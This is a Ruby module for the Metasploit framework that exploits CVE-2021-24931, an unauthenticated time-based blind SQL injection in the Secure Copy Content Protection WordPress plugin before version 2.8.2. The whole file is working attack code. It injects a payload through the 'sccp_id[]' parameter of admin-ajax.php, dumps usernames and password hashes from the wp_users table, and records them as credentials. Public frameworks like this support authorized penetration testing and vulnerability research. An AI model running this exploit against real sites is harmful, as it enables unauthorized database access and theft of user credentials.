##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  require 'metasploit/framework/hashes/identify'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress Secure Copy Content Protection and Content Locking sccp_id Unauthenticated SQLi',
        'Description' => %q{
          Secure Copy Content Protection and Content Locking, a WordPress plugin,
          prior to 2.8.2 is affected by an unauthenticated SQL injection via the
          'sccp_id[]' parameter.
        },
        'Author' => [
          'h00die', # msf module
          'Hacker5preme (Ron Jost)', # edb
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-24931'],
          ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md'],
          ['EDB', '50733'],
          ['WPVDB', '1cd52d61-af75-43ed-9b99-b46c471c4231'],
        ],
        'Actions' => [
          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
        ],
        'DefaultAction' => 'List Users',
        'DisclosureDate' => '2021-11-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options [
      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3])
    ]
  end

  def check_host(_ip)
    unless wordpress_and_online?
      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')
    end

    checkcode = check_plugin_version_from_readme('secure-copy-content-protection', '2.8.2')
    if checkcode == Msf::Exploit::CheckCode::Safe
      return Msf::Exploit::CheckCode::Safe('Secure Copy Content Protection and Content Locking version not vulnerable')
    end

    print_good('Vulnerable version of Secure Copy Content Protection and Content Locking detected')
    checkcode
  end

  def run_host(ip)
    id = Rex::Text.rand_text_numeric(1)
    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
      res = send_request_cgi({
        'method' => 'POST',
        'keep_cookies' => true,
        'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),
        'vars_get' => {
          'action' => 'ays_sccp_results_export_file',
          'sccp_id[]' => "#{id}) AND (SELECT #{Rex::Text.rand_text_numeric(4)} FROM (SELECT(#{payload}))#{Rex::Text.rand_text_alpha(4)})-- #{Rex::Text.rand_text_alpha(4)}",
          'type' => 'json'
        }
      })
      fail_with Failure::Unreachable, 'Connection failed' unless res
    end

    unless @sqli.test_vulnerable
      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
      return
    end
    columns = ['user_login', 'user_pass']

    print_status('Enumerating Usernames and Password Hashes')
    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])

    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
    data.each do |user|
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: identify_hash(user[1]),
        private_data: user[1],
        service_name: 'Wordpress',
        address: ip,
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
      table << user
    end
    print_good('Dumped table contents:')
    print_line(table.to_s)
  end
end
